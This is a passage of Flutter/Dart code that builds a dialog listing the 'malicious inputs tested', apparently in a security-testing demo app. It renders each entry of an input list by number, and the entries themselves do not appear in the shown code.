      context: context,
      builder: (BuildContext context) {
        return AlertDialog(
          title: Row(
            children: [
              Icon(Icons.list, color: Colors.blue),
              SizedBox(width: 8),
              Text('Detailed Attack List'),
            ],
          ),
          content: Container(
            width: double.maxFinite,
            height: 400,
            child: SingleChildScrollView(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text('All malicious inputs tested:', style: TextStyle(fontWeight: FontWeight.bold)),
                  SizedBox(height: 8),
                  ...maliciousInputs.asMap().entries.map((entry) {
                    int index = entry.key + 1;
                    String attack = entry.value;
                    return Padding(
                      padding: EdgeInsets.symmetric(vertical: 2),
                      child: Container(
                        padding: EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: Colors.grey.shade100,
                          borderRadius: BorderRadius.circular(4),
                        ),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text('Attack #$index:', style: TextStyle(fontWeight: FontWeight.bold)),
                            Text(attack, style: TextStyle(fontSize: 12, fontFamily: 'monospace')),
                          ],
                        ),
                      ),
                    );
                  }).toList(),
                ],
              ),
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.of(context).pop(),
              child: Text('Close'),
            ),
          ],
        );
      },
    );
  }
}
